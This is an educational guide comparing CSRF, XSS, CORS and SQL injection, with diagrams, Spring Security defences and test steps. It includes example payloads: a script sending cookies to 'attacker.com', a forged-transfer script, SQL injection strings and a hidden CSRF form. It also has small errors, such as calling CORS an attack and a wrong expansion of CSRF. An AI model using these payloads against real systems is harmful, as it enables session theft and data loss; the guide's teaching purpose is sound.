# Security Attacks - Quick Comparison Guide

## At a Glance - The Key Differences

```
CSRF:  "I trick YOUR browser into making requests YOU didn't intend"
XSS:   "I inject MY malicious script that runs in YOUR browser"
CORS:  "I try to access YOUR API from MY unauthorized website"
SQL:   "I inject MY malicious code into YOUR database queries"
```

---

## Visual Comparison

### CSRF Attack Flow
```
┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│   Victim    │────1───▶│  Bank.com    │         │  Attacker   │
│   (User)    │◀───2────│  (Logged in) │         │   Website   │
└─────────────┘         └──────────────┘         └─────────────┘
       │                                                  │
       │                                                  │
       └──────────────3. Visits─────────────────────────▶│
       │                                                  │
       │◀────4. Hidden form auto-submits to Bank.com─────┘
       │
       └──────5. Browser sends cookie to Bank.com────────▶
                  (Bank thinks it's legitimate!)
```

### XSS Attack Flow
```
┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│   Victim    │         │   Website    │         │  Attacker   │
└─────────────┘         └──────────────┘         └─────────────┘
                               │
       ┌───────────────────────┘
       │
       │  1. Attacker posts: <script>steal(cookie)</script>
       │
       ▼
  [Database stores malicious script]
       │
       │  2. Victim visits page
       │
       ▼
  [Website displays comment with script]
       │
       │  3. Script executes in victim's browser
       │
       ▼
  [Attacker receives victim's cookies/data]
```

### CORS Attack Flow
```
┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│   Browser   │         │   API.com    │         │  Evil.com   │
└─────────────┘         └──────────────┘         └─────────────┘
       │                                                  │
       │────1. User visits evil.com──────────────────────▶│
       │                                                  │
       │◀───2. Page loads with JS to call API.com────────┘
       │
       │────3. Browser makes request to API.com──────────▶
       │                (Origin: evil.com)
       │
       │◀───4. API checks Origin header──────────────────┘
       │        ✗ evil.com not allowed
       │        Browser blocks response
```

### SQL Injection Attack Flow
```
┌─────────────┐         ┌──────────────┐         ┌─────────────┐
│   Attacker  │         │  Web App     │         │  Database   │
└─────────────┘         └──────────────┘         └─────────────┘
       │                       │                        │
       │──1. Input: admin'--───▶                       │
       │                       │                        │
       │                       │──2. Query built:───────▶
       │                       │   SELECT * FROM users
       │                       │   WHERE user='admin'--'
       │                       │   (password check bypassed!)
       │                       │                        │
       │                       │◀──3. Returns admin─────┘
       │◀──4. Logged in!───────┘
```

---

## Detailed Comparison Table

| Aspect | CSRF | XSS | CORS | SQL Injection |
|--------|------|-----|------|---------------|
| **What is it?** | Forces authenticated user to perform unwanted actions | Injects malicious scripts into web pages | Unauthorized cross-origin resource access | Injects malicious SQL into database queries |
| **Attack Target** | User's session/authentication | User's browser | API/Backend resources | Database |
| **Who gets hurt?** | The authenticated user | Anyone viewing the page | The API/server | The database/application |
| **Attack Vector** | Malicious link/form on external site | Input fields, URL parameters, comments | JavaScript from different origin | Input fields, URL parameters |
| **Execution Location** | Victim's browser (via legitimate site) | Victim's browser | Victim's browser | Server's database |
| **Requires Authentication?** | YES - victim must be logged in | NO | NO | NO |
| **Malicious Code Type** | HTML form/link | JavaScript | JavaScript (AJAX/Fetch) | SQL commands |
| **Trust Exploited** | Browser trusts cookies | Website trusts user input | Browser's same-origin policy | Application trusts user input |
| **Example Attack** | Transfer money while user is logged in | Steal cookies via injected script | Access user data from evil.com | Delete tables, extract passwords |
| **Primary Defense** | CSRF tokens | Output encoding, CSP | CORS headers configuration | Prepared statements |
| **Spring Security Default** | ✅ Enabled | ⚠️ Partial (depends on templating) | ⚠️ Must configure | ⚠️ Use JPA/Hibernate properly |

---

## Real-World Scenarios

### Scenario 1: Social Media Platform

#### CSRF Attack
```
User is logged into Facebook
→ Visits malicious site
→ Site has hidden form: "Post status: 'I love spam!'"
→ Form auto-submits to Facebook
→ Facebook sees valid session cookie
→ Post is published without user knowing
```

#### XSS Attack
```
Attacker posts comment: "<script>sendCookies()</script>"
→ Comment stored in database
→ Other users view the post
→ Script executes in their browsers
→ Their session cookies sent to attacker
→ Attacker can impersonate them
```

#### CORS Attack
```
User visits evil.com while logged into Facebook
→ evil.com tries to call Facebook API
→ Browser sends request with cookies
→ Facebook checks Origin header
→ evil.com not allowed
→ Browser blocks the response
```

#### SQL Injection
```
Attacker searches for: "'; DROP TABLE posts; --"
→ If vulnerable, query becomes:
   SELECT * FROM posts WHERE title=''; DROP TABLE posts; --'
→ All posts deleted!
```

---

### Scenario 2: Banking Application

#### CSRF Attack
```
User logged into bank.com
Clicks link in email → evil.com
evil.com has form:
  <form action="bank.com/transfer">
    <input name="to" value="attacker-account">
    <input name="amount" value="10000">
  </form>
Form auto-submits
Bank sees valid session → Money transferred!
```

#### XSS Attack
```
Attacker adds beneficiary: "<script>fetch('attacker.com?data='+document.cookie)</script>"
When user views beneficiaries list
Script executes → Sends session to attacker
Attacker uses session to login as victim
```

#### CORS Attack
```
evil.com tries: fetch('bank.com/api/balance')
Browser adds: Origin: evil.com
Bank API checks CORS policy
evil.com not in allowed origins
Browser blocks response
(Even though request reached server!)
```

#### SQL Injection
```
Login form:
  Username: admin
  Password: ' OR '1'='1
Query: SELECT * FROM users 
       WHERE username='admin' 
       AND password='' OR '1'='1'
'1'='1' is always true → Login successful!
```

---

## Key Differences Explained

### 1. Where Does the Attack Execute?

```
CSRF:     Legitimate website (bank.com)
          ↳ But initiated from malicious site

XSS:      Legitimate website (bank.com)
          ↳ Malicious code stored/reflected there

CORS:     Malicious website (evil.com)
          ↳ Trying to access legitimate API

SQL Inj:  Server/Database
          ↳ Malicious code in database query
```

### 2. What Does the Attacker Control?

```
CSRF:     ✗ No code execution
          ✓ Can trigger actions (transfer, post, delete)
          ✓ Uses victim's authentication

XSS:      ✓ Full JavaScript execution
          ✓ Access to DOM, cookies, localStorage
          ✓ Can make requests as the user

CORS:     ✓ Can make requests
          ✗ Browser blocks reading responses
          ✗ Unless server misconfigured

SQL Inj:  ✓ Full database access
          ✓ Can read, modify, delete data
          ✓ Can execute system commands (worst case)
```

### 3. Authentication Required?

```
CSRF:     ✅ YES - Victim must be logged in
          (Otherwise no session to exploit)

XSS:      ❌ NO - Affects anyone viewing the page
          (But more dangerous if victim is logged in)

CORS:     ❌ NO - But more useful with authentication
          (Can try to access protected resources)

SQL Inj:  ❌ NO - Can attack login forms
          (Can bypass authentication entirely)
```

### 4. Visibility to Victim

```
CSRF:     🔴 Invisible
          User doesn't see anything suspicious
          Action happens in background

XSS:      🟡 Potentially visible
          Might see popup, redirect, or nothing
          Depends on attacker's script

CORS:     🔴 Invisible
          Blocked by browser silently
          User sees normal page behavior

SQL Inj:  🟡 Sometimes visible
          Might see error messages
          Or notice data changes
```

---

## Attack Combinations

### XSS + CSRF Bypass
```javascript
// XSS payload that performs CSRF
<script>
  // Get CSRF token from page
  let token = document.querySelector('[name=csrf-token]').value;
  
  // Make authenticated request with token
  fetch('/transfer', {
    method: 'POST',
    headers: {'X-CSRF-Token': token},
    body: JSON.stringify({to: 'attacker', amount: 10000})
  });
</script>
```
**Lesson**: XSS can bypass CSRF protection!

### SQL Injection + XSS
```sql
-- Inject XSS payload into database
INSERT INTO comments VALUES ('<script>alert("XSS")</script>');

-- When displayed, XSS executes
```
**Lesson**: SQL injection can plant XSS attacks!

---

## Prevention Summary

### CSRF Prevention
```java
// Spring Security (enabled by default)
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
);

// In HTML form
<input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}"/>
```
**Key**: Unique token per session/request

### XSS Prevention
```java
// Output encoding (Thymeleaf does automatically)
<p th:text="${userInput}"></p>  // Safe - encoded

// NOT this:
<p th:utext="${userInput}"></p> // Dangerous - unescaped

// Input validation
@Pattern(regexp = "^[a-zA-Z0-9 ]*$")
private String comment;
```
**Key**: Never trust user input, always encode output

### CORS Prevention
```java
@Configuration
public class CorsConfig {
    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping("/api/**")
                    .allowedOrigins("https://trusted-site.com") // Specific!
                    .allowedMethods("GET", "POST")
                    .allowCredentials(true);
            }
        };
    }
}
```
**Key**: Whitelist specific origins, never use `*` with credentials

### SQL Injection Prevention
```java
// ✅ SAFE - Prepared statement
@Query("SELECT u FROM User u WHERE username = :username")
User findByUsername(@Param("username") String username);

// ✅ SAFE - JPA method
User findByUsername(String username);

// ❌ DANGEROUS - String concatenation
@Query("SELECT u FROM User u WHERE username = '" + username + "'")
```
**Key**: Always use parameterized queries

---

## Quick Decision Tree

```
Is the attack exploiting...

├─ User's authentication/session?
│  └─ YES → Probably CSRF
│
├─ Injecting code that runs in browser?
│  └─ YES → Probably XSS
│
├─ Making cross-origin requests?
│  └─ YES → Probably CORS issue
│
└─ Injecting code into database queries?
   └─ YES → Probably SQL Injection
```

---

## Memory Aid - The 4 Attacks

```
CSRF = "Cookie Stealing Request Forgery"
       Uses YOUR cookies against YOU

XSS  = "eXecute Scripting on Site"
       Runs ATTACKER's script in YOUR browser

CORS = "Cross-Origin Resource Sharing"
       BLOCKS unauthorized cross-site access

SQL  = "Structured Query Language injection"
       Injects code into DATABASE queries
```

---

## Testing Each Attack

### Test CSRF Protection
```bash
# Try submitting form without CSRF token
curl -X POST http://localhost:8080/transfer \
  -d "to=attacker&amount=1000"
# Should get 403 Forbidden
```

### Test XSS Protection
```html
<!-- Try entering in comment field -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

<!-- Should be displayed as text, not executed -->
```

### Test CORS Protection
```javascript
// From browser console on different domain
fetch('http://localhost:8080/api/users')
  .then(r => r.json())
  .then(console.log)
  .catch(console.error);
// Should see CORS error
```

### Test SQL Injection Protection
```
# Try in login form
Username: admin' OR '1'='1' --
Password: anything

# Should fail to login
```

---

## Summary Table - One Liner Each

| Attack | One-Line Summary |
|--------|------------------|
| **CSRF** | Tricks your browser into making requests you didn't intend using your existing session |
| **XSS** | Injects malicious JavaScript that executes in victims' browsers when they view the page |
| **CORS** | Browser security that blocks websites from accessing APIs on different domains |
| **SQL Injection** | Injects malicious SQL code into queries to manipulate or extract database data |

---

## The Bottom Line

**All 4 attacks exploit TRUST:**

- **CSRF**: Exploits website's trust in the user's browser/cookies
- **XSS**: Exploits user's trust in the website's content
- **CORS**: Protects against exploiting browser's trust in cross-origin requests
- **SQL Injection**: Exploits application's trust in user input

**The solution?** 
- CSRF: Verify request origin with tokens
- XSS: Never trust user input, always encode output
- CORS: Explicitly whitelist trusted origins
- SQL Injection: Never concatenate user input into queries

---

**Remember**: Defense in depth! Use multiple layers of security, not just one technique.
